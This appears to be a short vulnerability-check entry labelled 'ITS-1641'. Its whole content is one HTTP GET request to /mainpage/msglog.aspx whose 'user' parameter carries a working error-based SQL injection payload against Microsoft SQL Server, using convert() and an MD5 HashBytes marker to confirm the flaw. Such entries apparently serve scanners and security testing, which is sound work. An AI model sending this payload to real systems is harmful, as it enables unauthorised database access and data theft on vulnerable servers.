# Vulnerable: ITS-1641
GET /mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))--
